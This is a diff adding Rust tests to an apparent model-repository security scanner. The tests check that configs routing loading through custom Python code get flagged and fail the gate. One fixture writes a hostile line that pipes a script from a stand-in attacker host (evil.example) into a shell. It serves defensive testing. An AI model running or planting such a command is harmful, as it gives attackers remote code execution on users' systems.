@@ -942,3 +942,98 @@ fn a_pickle_is_pinnable_too() {
     assert!(v["hashes"]["file"].as_str().unwrap().starts_with("blake3:"));
     let _ = std::fs::remove_dir_all(&dir);
 }
+
+// ===========================================================================
+// Remote code: what a loader executes before it reads a single weight
+// ===========================================================================
+
+/// The B3 regression: a repo whose `config.json` routes `from_pretrained` at a
+/// python file used to scan clean, because only the tensor container was read.
+#[test]
+fn a_repo_with_trust_remote_code_fails_the_gate() {
+    let dir = tmpdir("remote-code");
+    write(
+        &dir,
+        "model.safetensors",
+        &safetensors_f32(&[("model.layers.0.w", vec![1.0, 2.0])]),
+    );
+    write(
+        &dir,
+        "config.json",
+        br#"{"architectures":["MyModel"],
+             "auto_map":{"AutoModelForCausalLM":"modeling_evil.MyModel"}}"#,
+    );
+    write(
+        &dir,
+        "modeling_evil.py",
+        b"import os\nos.system(\"curl -s https://evil.example/x.sh | sh\")\n",
+    );
+
+    let (code, out) = run(&["scan", dir.to_str().unwrap(), "--fail-on", "high"]);
+    assert_eq!(code, 1, "remote code must fail the gate\n{out}");
+    assert!(out.contains("REMOTE_CODE_AUTO_MAP"), "{out}");
+    assert!(out.contains("PY_DANGEROUS_CALL"), "{out}");
+    assert!(out.contains("modeling_evil.py"), "{out}");
+    assert!(
+        out.contains("[python]"),
+        "the code is an artifact too:\n{out}"
+    );
+    // The weights themselves are still fine, and still say so.
+    assert!(out.contains("model.safetensors"), "{out}");
+    let _ = std::fs::remove_dir_all(&dir);
+}
+
+#[test]
+fn the_json_report_carries_the_code_artifacts() {
+    let dir = tmpdir("remote-code-json");
+    write(
+        &dir,
+        "model.safetensors",
+        &safetensors_f32(&[("model.layers.0.w", vec![1.0, 2.0])]),
+    );
+    write(
+        &dir,
+        "config.json",
+        br#"{"auto_map":{"AutoModel":"sketchy-org/backdoored--modeling_x.Model"}}"#,
+    );
+
+    let (code, out) = run(&["scan", dir.to_str().unwrap(), "--json"]);
+    assert_eq!(code, 1, "{out}");
+    let v: serde_json::Value = serde_json::from_str(&out).unwrap();
+    let artifacts = v["artifacts"].as_array().unwrap();
+    let cfg = artifacts
+        .iter()
+        .find(|a| a["format"] == "config")
+        .expect("a config artifact");
+    assert_eq!(cfg["verdict"], "untrusted");
+    assert_eq!(cfg["findings"][0]["id"], "REMOTE_CODE_EXTERNAL");
+    assert!(cfg["hashes"]["file"]
+        .as_str()
+        .unwrap()
+        .starts_with("blake3:"));
+    let _ = std::fs::remove_dir_all(&dir);
+}
+
+/// The check must stay quiet on the repos everyone actually has.
+#[test]
+fn a_repo_without_custom_code_is_unaffected() {
+    let dir = tmpdir("no-remote-code");
+    let p = write(
+        &dir,
+        "model.safetensors",
+        &safetensors_f32(&[("model.layers.0.w", vec![1.0, 2.0])]),
+    );
+    write(
+        &dir,
+        "config.json",
+        br#"{"model_type":"gpt2","n_layer":12}"#,
+    );
+    write(&dir, "tokenizer.json", b"{}");
+
+    let (code, out) = run(&["scan", dir.to_str().unwrap(), "--fail-on", "high"]);
+    assert_eq!(code, 0, "{out}");
+    assert!(!out.contains("REMOTE_CODE"), "false positive:\n{out}");
+    assert!(out.contains("scanned 1 artifact(s)"), "{out}");
+    assert!(p.exists());
+    let _ = std::fs::remove_dir_all(&dir);
+}
